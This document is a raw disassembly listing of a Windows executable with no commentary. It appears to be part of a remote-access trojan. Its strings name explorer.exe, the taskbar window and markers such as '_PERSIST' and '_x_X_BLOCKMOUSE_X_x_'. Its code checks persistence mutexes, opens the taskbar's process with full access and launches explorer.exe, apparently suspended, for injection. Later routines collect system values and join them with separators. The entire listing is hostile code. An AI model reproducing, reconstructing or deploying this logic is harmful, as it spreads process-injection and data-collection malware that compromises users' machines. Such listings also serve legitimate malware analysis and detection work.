  40b7e9:	79 77                	jns    0x40b862
  40b7eb:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7ec:	64 00 00             	add    %al,%fs:(%eax)
  40b7ef:	00 00                	add    %al,(%eax)
  40b7f1:	00 00                	add    %al,(%eax)
  40b7f3:	00 6f 70             	add    %ch,0x70(%edi)
  40b7f6:	65 6e                	outsb  %gs:(%esi),(%dx)
  40b7f8:	00 00                	add    %al,(%eax)
  40b7fa:	00 00                	add    %al,(%eax)
  40b7fc:	55                   	push   %ebp
  40b7fd:	8b ec                	mov    %esp,%ebp
  40b7ff:	83 c4 a4             	add    $0xffffffa4,%esp
  40b802:	53                   	push   %ebx
  40b803:	56                   	push   %esi
  40b804:	33 c0                	xor    %eax,%eax
  40b806:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  40b809:	33 c0                	xor    %eax,%eax
  40b80b:	55                   	push   %ebp
  40b80c:	68 fa b8 40 00       	push   $0x40b8fa
  40b811:	64 ff 30             	push   %fs:(%eax)
  40b814:	64 89 20             	mov    %esp,%fs:(%eax)
  40b817:	8b 15 04 d2 40 00    	mov    0x40d204,%edx
  40b81d:	8b 12                	mov    (%edx),%edx
  40b81f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40b822:	b9 10 b9 40 00       	mov    $0x40b910,%ecx
  40b827:	e8 70 65 ff ff       	call   0x401d9c
  40b82c:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  40b82f:	e8 14 67 ff ff       	call   0x401f48
  40b834:	50                   	push   %eax
  40b835:	6a 00                	push   $0x0
  40b837:	6a 00                	push   $0x0
  40b839:	e8 2a 7d ff ff       	call   0x403568
  40b83e:	8b d8                	mov    %eax,%ebx
  40b840:	e8 ab 7d ff ff       	call   0x4035f0
  40b845:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40b84a:	75 0b                	jne    0x40b857
  40b84c:	53                   	push   %ebx
  40b84d:	e8 e6 7c ff ff       	call   0x403538
  40b852:	e9 8d 00 00 00       	jmp    0x40b8e4
  40b857:	53                   	push   %ebx
  40b858:	e8 db 7c ff ff       	call   0x403538
  40b85d:	a1 cc d1 40 00       	mov    0x40d1cc,%eax
  40b862:	e8 35 67 ff ff       	call   0x401f9c
  40b867:	8b f0                	mov    %eax,%esi
  40b869:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40b86c:	50                   	push   %eax
  40b86d:	6a 00                	push   $0x0
  40b86f:	68 1c b9 40 00       	push   $0x40b91c
  40b874:	e8 77 7e ff ff       	call   0x4036f0
  40b879:	50                   	push   %eax
  40b87a:	e8 81 7e ff ff       	call   0x403700
  40b87f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40b882:	50                   	push   %eax
  40b883:	6a 00                	push   $0x0
  40b885:	68 ff 0f 1f 00       	push   $0x1f0fff
  40b88a:	e8 b9 7d ff ff       	call   0x403648
  40b88f:	8b d8                	mov    %eax,%ebx
  40b891:	8b d6                	mov    %esi,%edx
  40b893:	8b c3                	mov    %ebx,%eax
  40b895:	e8 5a 88 ff ff       	call   0x4040f4
  40b89a:	84 c0                	test   %al,%al
  40b89c:	75 46                	jne    0x40b8e4
  40b89e:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40b8a1:	ba 44 00 00 00       	mov    $0x44,%edx
  40b8a6:	e8 8d 7e ff ff       	call   0x403738
  40b8ab:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40b8ae:	ba 10 00 00 00       	mov    $0x10,%edx
  40b8b3:	e8 80 7e ff ff       	call   0x403738
  40b8b8:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40b8bb:	50                   	push   %eax
  40b8bc:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40b8bf:	50                   	push   %eax
  40b8c0:	6a 00                	push   $0x0
  40b8c2:	6a 00                	push   $0x0
  40b8c4:	6a 04                	push   $0x4
  40b8c6:	6a 00                	push   $0x0
  40b8c8:	6a 00                	push   $0x0
  40b8ca:	6a 00                	push   $0x0
  40b8cc:	68 2c b9 40 00       	push   $0x40b92c
  40b8d1:	6a 00                	push   $0x0
  40b8d3:	e8 b0 7c ff ff       	call   0x403588
  40b8d8:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  40b8db:	8b d6                	mov    %esi,%edx
  40b8dd:	8b c3                	mov    %ebx,%eax
  40b8df:	e8 10 88 ff ff       	call   0x4040f4
  40b8e4:	33 c0                	xor    %eax,%eax
  40b8e6:	5a                   	pop    %edx
  40b8e7:	59                   	pop    %ecx
  40b8e8:	59                   	pop    %ecx
  40b8e9:	64 89 10             	mov    %edx,%fs:(%eax)
  40b8ec:	68 01 b9 40 00       	push   $0x40b901
  40b8f1:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40b8f4:	e8 c7 61 ff ff       	call   0x401ac0
  40b8f9:	c3                   	ret
  40b8fa:	e9 0d 5f ff ff       	jmp    0x40180c
  40b8ff:	eb f0                	jmp    0x40b8f1
  40b901:	5e                   	pop    %esi
  40b902:	5b                   	pop    %ebx
  40b903:	8b e5                	mov    %ebp,%esp
  40b905:	5d                   	pop    %ebp
  40b906:	c3                   	ret
  40b907:	00 ff                	add    %bh,%bh
  40b909:	ff                   	(bad)
  40b90a:	ff                   	(bad)
  40b90b:	ff 08                	decl   (%eax)
  40b90d:	00 00                	add    %al,(%eax)
  40b90f:	00 5f 50             	add    %bl,0x50(%edi)
  40b912:	45                   	inc    %ebp
  40b913:	52                   	push   %edx
  40b914:	53                   	push   %ebx
  40b915:	49                   	dec    %ecx
  40b916:	53                   	push   %ebx
  40b917:	54                   	push   %esp
  40b918:	00 00                	add    %al,(%eax)
  40b91a:	00 00                	add    %al,(%eax)
  40b91c:	53                   	push   %ebx
  40b91d:	68 65 6c 6c 5f       	push   $0x5f6c6c65
  40b922:	54                   	push   %esp
  40b923:	72 61                	jb     0x40b986
  40b925:	79 57                	jns    0x40b97e
  40b927:	6e                   	outsb  %ds:(%esi),(%dx)
  40b928:	64 00 00             	add    %al,%fs:(%eax)
  40b92b:	00 65 78             	add    %ah,0x78(%ebp)
  40b92e:	70 6c                	jo     0x40b99c
  40b930:	6f                   	outsl  %ds:(%esi),(%dx)
  40b931:	72 65                	jb     0x40b998
  40b933:	72 2e                	jb     0x40b963
  40b935:	65 78 65             	gs js  0x40b99d
  40b938:	00 00                	add    %al,(%eax)
  40b93a:	00 00                	add    %al,(%eax)
  40b93c:	55                   	push   %ebp
  40b93d:	8b ec                	mov    %esp,%ebp
  40b93f:	33 c9                	xor    %ecx,%ecx
  40b941:	51                   	push   %ecx
  40b942:	51                   	push   %ecx
  40b943:	51                   	push   %ecx
  40b944:	51                   	push   %ecx
  40b945:	51                   	push   %ecx
  40b946:	53                   	push   %ebx
  40b947:	56                   	push   %esi
  40b948:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40b94b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40b94e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40b951:	e8 e2 65 ff ff       	call   0x401f38
  40b956:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40b959:	e8 da 65 ff ff       	call   0x401f38
  40b95e:	33 c0                	xor    %eax,%eax
  40b960:	55                   	push   %ebp
  40b961:	68 4a ba 40 00       	push   $0x40ba4a
  40b966:	64 ff 30             	push   %fs:(%eax)
  40b969:	64 89 20             	mov    %esp,%fs:(%eax)
  40b96c:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40b96f:	33 c0                	xor    %eax,%eax
  40b971:	e8 2e 5a ff ff       	call   0x4013a4
  40b976:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40b979:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40b97c:	b9 60 ba 40 00       	mov    $0x40ba60,%ecx
  40b981:	e8 16 64 ff ff       	call   0x401d9c
  40b986:	ff 75 f4             	push   -0xc(%ebp)
  40b989:	ff 75 fc             	push   -0x4(%ebp)
  40b98c:	68 60 ba 40 00       	push   $0x40ba60
  40b991:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40b994:	ba 03 00 00 00       	mov    $0x3,%edx
  40b999:	e8 72 64 ff ff       	call   0x401e10
  40b99e:	be 65 00 00 00       	mov    $0x65,%esi
  40b9a3:	8b 1d c4 d1 40 00    	mov    0x40d1c4,%ebx
  40b9a9:	83 3b 00             	cmpl   $0x0,(%ebx)
  40b9ac:	74 32                	je     0x40b9e0
  40b9ae:	8b 03                	mov    (%ebx),%eax
  40b9b0:	ba 6c ba 40 00       	mov    $0x40ba6c,%edx
  40b9b5:	e8 da 64 ff ff       	call   0x401e94
  40b9ba:	74 24                	je     0x40b9e0
  40b9bc:	ff 75 f4             	push   -0xc(%ebp)
  40b9bf:	8d 55 ec             	lea    -0x14(%ebp),%edx
  40b9c2:	8b 03                	mov    (%ebx),%eax
  40b9c4:	e8 13 89 ff ff       	call   0x4042dc
  40b9c9:	ff 75 ec             	push   -0x14(%ebp)
  40b9cc:	68 78 ba 40 00       	push   $0x40ba78
  40b9d1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40b9d4:	ba 03 00 00 00       	mov    $0x3,%edx
  40b9d9:	e8 32 64 ff ff       	call   0x401e10
  40b9de:	eb 1a                	jmp    0x40b9fa
  40b9e0:	ff 75 f4             	push   -0xc(%ebp)
  40b9e3:	68 6c ba 40 00       	push   $0x40ba6c
  40b9e8:	68 78 ba 40 00       	push   $0x40ba78
  40b9ed:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40b9f0:	ba 03 00 00 00       	mov    $0x3,%edx
  40b9f5:	e8 16 64 ff ff       	call   0x401e10
  40b9fa:	83 c3 04             	add    $0x4,%ebx
  40b9fd:	4e                   	dec    %esi
  40b9fe:	75 a9                	jne    0x40b9a9
  40ba00:	ff 75 f4             	push   -0xc(%ebp)
  40ba03:	68 6c ba 40 00       	push   $0x40ba6c
  40ba08:	68 78 ba 40 00       	push   $0x40ba78
  40ba0d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40ba10:	ba 03 00 00 00       	mov    $0x3,%edx
  40ba15:	e8 f6 63 ff ff       	call   0x401e10
  40ba1a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40ba1d:	e8 2e 63 ff ff       	call   0x401d50
  40ba22:	8b c8                	mov    %eax,%ecx
  40ba24:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40ba27:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40ba2a:	e8 41 a3 ff ff       	call   0x405d70
  40ba2f:	33 c0                	xor    %eax,%eax
  40ba31:	5a                   	pop    %edx
  40ba32:	59                   	pop    %ecx
  40ba33:	59                   	pop    %ecx
  40ba34:	64 89 10             	mov    %edx,%fs:(%eax)
  40ba37:	68 51 ba 40 00       	push   $0x40ba51
  40ba3c:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40ba3f:	ba 05 00 00 00       	mov    $0x5,%edx
  40ba44:	e8 9b 60 ff ff       	call   0x401ae4
  40ba49:	c3                   	ret
  40ba4a:	e9 bd 5d ff ff       	jmp    0x40180c
  40ba4f:	eb eb                	jmp    0x40ba3c
  40ba51:	5e                   	pop    %esi
  40ba52:	5b                   	pop    %ebx
  40ba53:	8b e5                	mov    %ebp,%esp
  40ba55:	5d                   	pop    %ebp
  40ba56:	c3                   	ret
  40ba57:	00 ff                	add    %bh,%bh
  40ba59:	ff                   	(bad)
  40ba5a:	ff                   	(bad)
  40ba5b:	ff 01                	incl   (%ecx)
  40ba5d:	00 00                	add    %al,(%eax)
  40ba5f:	00 7c 00 00          	add    %bh,0x0(%eax,%eax,1)
  40ba63:	00 ff                	add    %bh,%bh
  40ba65:	ff                   	(bad)
  40ba66:	ff                   	(bad)
  40ba67:	ff 01                	incl   (%ecx)
  40ba69:	00 00                	add    %al,(%eax)
  40ba6b:	00 20                	add    %ah,(%eax)
  40ba6d:	00 00                	add    %al,(%eax)
  40ba6f:	00 ff                	add    %bh,%bh
  40ba71:	ff                   	(bad)
  40ba72:	ff                   	(bad)
  40ba73:	ff 09                	decl   (%ecx)
  40ba75:	00 00                	add    %al,(%eax)
  40ba77:	00 23                	add    %ah,(%ebx)
  40ba79:	23 23                	and    (%ebx),%esp
  40ba7b:	23 40 23             	and    0x23(%eax),%eax
  40ba7e:	23 23                	and    (%ebx),%esp
  40ba80:	23 00                	and    (%eax),%eax
  40ba82:	00 00                	add    %al,(%eax)
  40ba84:	53                   	push   %ebx
  40ba85:	68 b8 ba 40 00       	push   $0x40bab8
  40ba8a:	6a 00                	push   $0x0
  40ba8c:	6a 00                	push   $0x0
  40ba8e:	e8 d5 7a ff ff       	call   0x403568
  40ba93:	8b d8                	mov    %eax,%ebx
  40ba95:	e8 56 7b ff ff       	call   0x4035f0
  40ba9a:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40ba9f:	75 0a                	jne    0x40baab
  40baa1:	53                   	push   %ebx
  40baa2:	e8 91 7a ff ff       	call   0x403538
  40baa7:	33 c0                	xor    %eax,%eax
  40baa9:	5b                   	pop    %ebx
  40baaa:	c3                   	ret
  40baab:	53                   	push   %ebx
  40baac:	e8 87 7a ff ff       	call   0x403538
  40bab1:	b0 01                	mov    $0x1,%al
  40bab3:	5b                   	pop    %ebx
  40bab4:	c3                   	ret
  40bab5:	00 00                	add    %al,(%eax)
  40bab7:	00 5f 78             	add    %bl,0x78(%edi)
  40baba:	5f                   	pop    %edi
  40babb:	58                   	pop    %eax
  40babc:	5f                   	pop    %edi
  40babd:	42                   	inc    %edx
  40babe:	4c                   	dec    %esp
  40babf:	4f                   	dec    %edi
  40bac0:	43                   	inc    %ebx
  40bac1:	4b                   	dec    %ebx
  40bac2:	4d                   	dec    %ebp
  40bac3:	4f                   	dec    %edi
  40bac4:	55                   	push   %ebp
  40bac5:	53                   	push   %ebx
  40bac6:	45                   	inc    %ebp
  40bac7:	5f                   	pop    %edi
  40bac8:	58                   	pop    %eax
  40bac9:	5f                   	pop    %edi
  40baca:	78 5f                	js     0x40bb2b
  40bacc:	00 00                	add    %al,(%eax)
  40bace:	00 00                	add    %al,(%eax)
  40bad0:	55                   	push   %ebp
  40bad1:	8b ec                	mov    %esp,%ebp
  40bad3:	33 c0                	xor    %eax,%eax
  40bad5:	55                   	push   %ebp
  40bad6:	68 f9 ba 40 00       	push   $0x40baf9
  40badb:	64 ff 30             	push   %fs:(%eax)
  40bade:	64 89 20             	mov    %esp,%fs:(%eax)
  40bae1:	b8 e8 f1 40 00       	mov    $0x40f1e8,%eax
  40bae6:	e8 d5 5f ff ff       	call   0x401ac0
  40baeb:	33 c0                	xor    %eax,%eax
  40baed:	5a                   	pop    %edx
  40baee:	59                   	pop    %ecx
  40baef:	59                   	pop    %ecx
  40baf0:	64 89 10             	mov    %edx,%fs:(%eax)
  40baf3:	68 00 bb 40 00       	push   $0x40bb00
  40baf8:	c3                   	ret
  40baf9:	e9 0e 5d ff ff       	jmp    0x40180c
  40bafe:	eb f8                	jmp    0x40baf8
  40bb00:	5d                   	pop    %ebp
  40bb01:	c3                   	ret
  40bb02:	8b c0                	mov    %eax,%eax
  40bb04:	1d 00 00 00 0c       	sbb    $0xc000000,%eax
  40bb09:	bb 40 00 98 34       	mov    $0x34980040,%ebx
  40bb0e:	40                   	inc    %eax
  40bb0f:	00 5c 34 40          	add    %bl,0x40(%esp,%esi,1)
  40bb13:	00 f4                	add    %dh,%ah
  40bb15:	32 40 00             	xor    0x0(%eax),%al
  40bb18:	b8 32 40 00 d0       	mov    $0xd0004032,%eax
  40bb1d:	34 40                	xor    $0x40,%al
  40bb1f:	00 a0 34 40 00 80    	add    %ah,-0x7fffbfcc(%eax)
  40bb25:	37                   	aaa
  40bb26:	40                   	inc    %eax
  40bb27:	00 50 37             	add    %dl,0x37(%eax)
  40bb2a:	40                   	inc    %eax
  40bb2b:	00 48 42             	add    %cl,0x42(%eax)
  40bb2e:	40                   	inc    %eax
  40bb2f:	00 18                	add    %bl,(%eax)
  40bb31:	42                   	inc    %edx
  40bb32:	40                   	inc    %eax
  40bb33:	00 fc                	add    %bh,%ah
  40bb35:	45                   	inc    %ebp
  40bb36:	40                   	inc    %eax
  40bb37:	00 cc                	add    %cl,%ah
  40bb39:	45                   	inc    %ebp
  40bb3a:	40                   	inc    %eax
  40bb3b:	00 9c 46 40 00 44 46 	add    %bl,0x46440040(%esi,%eax,2)
  40bb42:	40                   	inc    %eax
  40bb43:	00 78 48             	add    %bh,0x48(%eax)
  40bb46:	40                   	inc    %eax
  40bb47:	00 48 48             	add    %cl,0x48(%eax)
  40bb4a:	40                   	inc    %eax
  40bb4b:	00 14 49             	add    %dl,(%ecx,%ecx,2)
  40bb4e:	40                   	inc    %eax
  40bb4f:	00 e4                	add    %ah,%ah
  40bb51:	48                   	dec    %eax
  40bb52:	40                   	inc    %eax
  40bb53:	00 08                	add    %cl,(%eax)
  40bb55:	4e                   	dec    %esi
  40bb56:	40                   	inc    %eax
  40bb57:	00 88 4c 40 00 1c    	add    %cl,0x1c00404c(%eax)
  40bb5d:	51                   	push   %ecx
  40bb5e:	40                   	inc    %eax
  40bb5f:	00 ec                	add    %ch,%ah
  40bb61:	50                   	push   %eax
  40bb62:	40                   	inc    %eax
  40bb63:	00 d8                	add    %bl,%al
  40bb65:	58                   	pop    %eax
  40bb66:	40                   	inc    %eax
  40bb67:	00 a8 58 40 00 e0    	add    %ch,-0x1fffbfa8(%eax)
  40bb6d:	67 40                	addr16 inc %eax
  40bb6f:	00 b0 67 40 00 4c    	add    %dh,0x4c004067(%eax)
  40bb75:	6b 40 00 10          	imul   $0x10,0x0(%eax),%eax
  40bb79:	6b 40 00 30          	imul   $0x30,0x0(%eax),%eax
  40bb7d:	71 40                	jno    0x40bbbf
  40bb7f:	00 00                	add    %al,(%eax)
  40bb81:	71 40                	jno    0x40bbc3
  40bb83:	00 68 71             	add    %ch,0x71(%eax)
  40bb86:	40                   	inc    %eax
  40bb87:	00 38                	add    %bh,(%eax)
  40bb89:	71 40                	jno    0x40bbcb
  40bb8b:	00 bc 71 40 00 8c 71 	add    %bh,0x718c0040(%ecx,%esi,2)
  40bb92:	40                   	inc    %eax
  40bb93:	00 f4                	add    %dh,%ah
  40bb95:	71 40                	jno    0x40bbd7
  40bb97:	00 c4                	add    %al,%ah
  40bb99:	71 40                	jno    0x40bbdb
  40bb9b:	00 3c 72             	add    %bh,(%edx,%esi,2)
  40bb9e:	40                   	inc    %eax
  40bb9f:	00 0c 72             	add    %cl,(%edx,%esi,2)
  40bba2:	40                   	inc    %eax
  40bba3:	00 28                	add    %ch,(%eax)
  40bba5:	7b 40                	jnp    0x40bbe7
  40bba7:	00 ec                	add    %ch,%ah
  40bba9:	7a 40                	jp     0x40bbeb
  40bbab:	00 b4 86 40 00 6c 86 	add    %dh,-0x7993ffc0(%esi,%eax,4)
  40bbb2:	40                   	inc    %eax
  40bbb3:	00 28                	add    %ch,(%eax)
  40bbb5:	87 40 00             	xchg   %eax,0x0(%eax)
  40bbb8:	f8                   	clc
  40bbb9:	86 40 00             	xchg   %al,0x0(%eax)
  40bbbc:	58                   	pop    %eax
  40bbbd:	89 40 00             	mov    %eax,0x0(%eax)
  40bbc0:	1c 89                	sbb    $0x89,%al
  40bbc2:	40                   	inc    %eax
  40bbc3:	00 c0                	add    %al,%al
  40bbc5:	89 40 00             	mov    %eax,0x0(%eax)
  40bbc8:	90                   	nop
  40bbc9:	89 40 00             	mov    %eax,0x0(%eax)
  40bbcc:	b4 97                	mov    $0x97,%ah
  40bbce:	40                   	inc    %eax
  40bbcf:	00 84 97 40 00 78 99 	add    %al,-0x6687ffc0(%edi,%edx,4)
  40bbd6:	40                   	inc    %eax
  40bbd7:	00 48 99             	add    %cl,-0x67(%eax)
  40bbda:	40                   	inc    %eax
  40bbdb:	00 8c ae 40 00 50 ae 	add    %cl,-0x51afffc0(%esi,%ebp,4)
  40bbe2:	40                   	inc    %eax
  40bbe3:	00 b0 b0 40 00 80    	add    %dh,-0x7fffbf50(%eax)
  40bbe9:	b0 40                	mov    $0x40,%al
  40bbeb:	00 00                	add    %al,(%eax)
  40bbed:	00 00                	add    %al,(%eax)
  40bbef:	00 d0                	add    %dl,%al
  40bbf1:	ba 40 00 55 8b       	mov    $0x8b550040,%edx
  40bbf6:	ec                   	in     (%dx),%al
  40bbf7:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40bbfc:	6a 00                	push   $0x0
  40bbfe:	6a 00                	push   $0x0
  40bc00:	49                   	dec    %ecx
  40bc01:	75 f9                	jne    0x40bbfc
  40bc03:	53                   	push   %ebx
  40bc04:	b8 04 bb 40 00       	mov    $0x40bb04,%eax
  40bc09:	e8 0a 78 ff ff       	call   0x403418
  40bc0e:	33 c0                	xor    %eax,%eax
  40bc10:	55                   	push   %ebp
  40bc11:	68 c4 c0 40 00       	push   $0x40c0c4
  40bc16:	64 ff 30             	push   %fs:(%eax)
  40bc19:	64 89 20             	mov    %esp,%fs:(%eax)
  40bc1c:	68 d4 c0 40 00       	push   $0x40c0d4
  40bc21:	6a 00                	push   $0x0
  40bc23:	6a 00                	push   $0x0
  40bc25:	e8 3e 79 ff ff       	call   0x403568
  40bc2a:	8b d8                	mov    %eax,%ebx
  40bc2c:	e8 bf 79 ff ff       	call   0x4035f0
  40bc31:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40bc36:	75 12                	jne    0x40bc4a
  40bc38:	53                   	push   %ebx
  40bc39:	e8 fa 78 ff ff       	call   0x403538
  40bc3e:	68 e0 2e 00 00       	push   $0x2ee0
  40bc43:	e8 30 7a ff ff       	call   0x403678
  40bc48:	eb 06                	jmp    0x40bc50
  40bc4a:	53                   	push   %ebx
  40bc4b:	e8 e8 78 ff ff       	call   0x403538
  40bc50:	68 e8 c0 40 00       	push   $0x40c0e8
  40bc55:	6a 00                	push   $0x0
  40bc57:	6a 00                	push   $0x0
  40bc59:	e8 0a 79 ff ff       	call   0x403568
  40bc5e:	8b d8                	mov    %eax,%ebx
  40bc60:	e8 8b 79 ff ff       	call   0x4035f0
  40bc65:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40bc6a:	0f 85 2a 02 00 00    	jne    0x40be9a
  40bc70:	53                   	push   %ebx
  40bc71:	e8 c2 78 ff ff       	call   0x403538
  40bc76:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40bc79:	e8 56 de ff ff       	call   0x409ad4
  40bc7e:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40bc81:	b8 ec f1 40 00       	mov    $0x40f1ec,%eax
  40bc86:	e8 89 5e ff ff       	call   0x401b14
  40bc8b:	83 3d ec f1 40 00 00 	cmpl   $0x0,0x40f1ec
  40bc92:	74 2f                	je     0x40bcc3
  40bc94:	a1 ec f1 40 00       	mov    0x40f1ec,%eax
  40bc99:	e8 b2 60 ff ff       	call   0x401d50
  40bc9e:	50                   	push   %eax
  40bc9f:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40bca2:	e8 61 a3 ff ff       	call   0x406008
  40bca7:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40bcaa:	ba 08 c1 40 00       	mov    $0x40c108,%edx
  40bcaf:	e8 a4 60 ff ff       	call   0x401d58
  40bcb4:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40bcb7:	8b 15 ec f1 40 00    	mov    0x40f1ec,%edx
  40bcbd:	59                   	pop    %ecx
  40bcbe:	e8 ad a0 ff ff       	call   0x405d70
  40bcc3:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40bcc6:	e8 5d e0 ff ff       	call   0x409d28
  40bccb:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40bcce:	b8 ec f1 40 00       	mov    $0x40f1ec,%eax
  40bcd3:	e8 3c 5e ff ff       	call   0x401b14
  40bcd8:	83 3d ec f1 40 00 00 	cmpl   $0x0,0x40f1ec
  40bcdf:	74 2f                	je     0x40bd10
  40bce1:	a1 ec f1 40 00       	mov    0x40f1ec,%eax
  40bce6:	e8 65 60 ff ff       	call   0x401d50
  40bceb:	50                   	push   %eax
  40bcec:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40bcef:	e8 14 a3 ff ff       	call   0x406008
  40bcf4:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40bcf7:	ba 1c c1 40 00       	mov    $0x40c11c,%edx
  40bcfc:	e8 57 60 ff ff       	call   0x401d58
  40bd01:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40bd04:	8b 15 ec f1 40 00    	mov    0x40f1ec,%edx
  40bd0a:	59                   	pop    %ecx
  40bd0b:	e8 60 a0 ff ff       	call   0x405d70
  40bd10:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40bd13:	e8 e0 e1 ff ff       	call   0x409ef8
  40bd18:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40bd1b:	b8 ec f1 40 00       	mov    $0x40f1ec,%eax
  40bd20:	e8 ef 5d ff ff       	call   0x401b14
  40bd25:	83 3d ec f1 40 00 00 	cmpl   $0x0,0x40f1ec
  40bd2c:	74 2f                	je     0x40bd5d
  40bd2e:	a1 ec f1 40 00       	mov    0x40f1ec,%eax
  40bd33:	e8 18 60 ff ff       	call   0x401d50
  40bd38:	50                   	push   %eax
  40bd39:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40bd3c:	e8 c7 a2 ff ff       	call   0x406008
  40bd41:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40bd44:	ba 2c c1 40 00       	mov    $0x40c12c,%edx
  40bd49:	e8 0a 60 ff ff       	call   0x401d58
  40bd4e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40bd51:	8b 15 ec f1 40 00    	mov    0x40f1ec,%edx
  40bd57:	59                   	pop    %ecx
  40bd58:	e8 13 a0 ff ff       	call   0x405d70
  40bd5d:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40bd60:	e8 1f dd ff ff       	call   0x409a84
  40bd65:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40bd68:	b8 ec f1 40 00       	mov    $0x40f1ec,%eax
  40bd6d:	e8 a2 5d ff ff       	call   0x401b14
  40bd72:	83 3d ec f1 40 00 00 	cmpl   $0x0,0x40f1ec
  40bd79:	74 2f                	je     0x40bdaa
  40bd7b:	a1 ec f1 40 00       	mov    0x40f1ec,%eax
  40bd80:	e8 cb 5f ff ff       	call   0x401d50
  40bd85:	50                   	push   %eax
  40bd86:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40bd89:	e8 7a a2 ff ff       	call   0x406008
  40bd8e:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40bd91:	ba 40 c1 40 00       	mov    $0x40c140,%edx
  40bd96:	e8 bd 5f ff ff       	call   0x401d58
  40bd9b:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40bd9e:	8b 15 ec f1 40 00    	mov    0x40f1ec,%edx
  40bda4:	59                   	pop    %ecx
  40bda5:	e8 c6 9f ff ff       	call   0x405d70
  40bdaa:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40bdad:	e8 de dc ff ff       	call   0x409a90
  40bdb2:	8b 55 cc             	mov    -0x34(%ebp),%edx
  40bdb5:	b8 ec f1 40 00       	mov    $0x40f1ec,%eax
  40bdba:	e8 55 5d ff ff       	call   0x401b14
  40bdbf:	83 3d ec f1 40 00 00 	cmpl   $0x0,0x40f1ec
  40bdc6:	74 2f                	je     0x40bdf7
  40bdc8:	a1 ec f1 40 00       	mov    0x40f1ec,%eax
  40bdcd:	e8 7e 5f ff ff       	call   0x401d50
  40bdd2:	50                   	push   %eax
  40bdd3:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40bdd6:	e8 2d a2 ff ff       	call   0x406008
  40bddb:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40bdde:	ba 54 c1 40 00       	mov    $0x40c154,%edx
  40bde3:	e8 70 5f ff ff       	call   0x401d58
  40bde8:	8b 45 c8             	mov    -0x38(%ebp),%eax
  40bdeb:	8b 15 ec f1 40 00    	mov    0x40f1ec,%edx
  40bdf1:	59                   	pop    %ecx
  40bdf2:	e8 79 9f ff ff       	call   0x405d70
  40bdf7:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40bdfa:	e8 9d dc ff ff       	call   0x409a9c
  40bdff:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  40be02:	b8 ec f1 40 00       	mov    $0x40f1ec,%eax
  40be07:	e8 08 5d ff ff       	call   0x401b14
  40be0c:	83 3d ec f1 40 00 00 	cmpl   $0x0,0x40f1ec
  40be13:	74 2f                	je     0x40be44
  40be15:	a1 ec f1 40 00       	mov    0x40f1ec,%eax
  40be1a:	e8 31 5f ff ff       	call   0x401d50
  40be1f:	50                   	push   %eax
  40be20:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40be23:	e8 e0 a1 ff ff       	call   0x406008
  40be28:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40be2b:	ba 68 c1 40 00       	mov    $0x40c168,%edx
  40be30:	e8 23 5f ff ff       	call   0x401d58
  40be35:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40be38:	8b 15 ec f1 40 00    	mov    0x40f1ec,%edx
  40be3e:	59                   	pop    %ecx
  40be3f:	e8 2c 9f ff ff       	call   0x405d70
  40be44:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40be47:	e8 6c dc ff ff       	call   0x409ab8
  40be4c:	8b 55 bc             	mov    -0x44(%ebp),%edx
  40be4f:	b8 ec f1 40 00       	mov    $0x40f1ec,%eax
  40be54:	e8 bb 5c ff ff       	call   0x401b14
  40be59:	83 3d ec f1 40 00 00 	cmpl   $0x0,0x40f1ec
  40be60:	0f 84 43 02 00 00    	je     0x40c0a9
  40be66:	a1 ec f1 40 00       	mov    0x40f1ec,%eax
